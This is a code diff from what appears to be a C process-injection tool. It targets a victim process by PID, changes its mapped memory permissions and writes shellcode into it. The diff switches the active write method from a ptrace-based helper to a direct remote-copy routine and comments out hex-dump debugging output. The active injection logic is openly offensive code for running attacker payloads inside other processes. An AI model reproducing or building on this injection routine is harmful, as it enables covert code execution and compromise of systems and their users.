@@ -353,32 +353,32 @@ int main(int argc, char* argv[])
 			// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
 			fprintf(stdout, "[*] Modified mapped memory permissions (rw-p)\n");  // DEBUGGING
 
-			fprintf(stdout, "BEFORE\n");  // DEBUGGING
-			for (int i = 0; i < tmpPM_ptr->length; i++)
-			{
-				fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
-			}
-			fprintf(stdout, "\n");
+			// fprintf(stdout, "BEFORE\n");  // DEBUGGING
+			// for (int i = 0; i < tmpPM_ptr->length; i++)
+			// {
+			// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
+			// }
+			// fprintf(stdout, "\n");
 
 
 			// getchar();  // DEBUGGING
 			// getchar();  // DEBUGGING
 			// 6.2. Write the payload to memory
 			// Attempt #1 - Read in shellcode and write it to the process
-			// tempRetVal = copy_local_to_remote(vicPID->pidNum, \
-			// 								  tmpPM_ptr->addr_start, \
-			// 								  payloadContents, \
-			// 								  payloadSize);
+			tempRetVal = copy_local_to_remote(vicPID->pidNum, \
+											  tmpPM_ptr->addr_start, \
+											  payloadContents, \
+											  payloadSize);
 			// Attempt #2 - Write a buffer of shellcode to the process
 			// if (copy_local_to_remote(vicPID->pidNum, \
 			// 						 tmpPM_ptr->addr_start, \
 			// 						 payloadContents, \
 			// 						 sizeof(code)/sizeof(*code)))
 			// Attempt #3 - Same as #1 but use ptrace(PTRACE_POKEDATA) instead
-			tempRetVal = htrace_write_data(vicPID->pidNum, \
-										   tmpPM_ptr->addr_start, \
-										   payloadContents, \
-										   payloadSize);
+			// tempRetVal = htrace_write_data(vicPID->pidNum, \
+			// 							   tmpPM_ptr->addr_start, \
+			// 							   payloadContents, \
+			// 							   payloadSize);
 
 			if (tempRetVal)
 			{
@@ -400,12 +400,12 @@ int main(int argc, char* argv[])
 			// }
 			else
 			{
-				fprintf(stdout, "\nAFTER\n");  // DEBUGGING
-				for (int i = 0; i < tmpPM_ptr->length; i++)
-				{
-					fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
-				}
-				fprintf(stdout, "\n");
+				// fprintf(stdout, "\nAFTER\n");  // DEBUGGING
+				// for (int i = 0; i < tmpPM_ptr->length; i++)
+				// {
+				// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
+				// }
+				// fprintf(stdout, "\n");
 
 				fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
 				
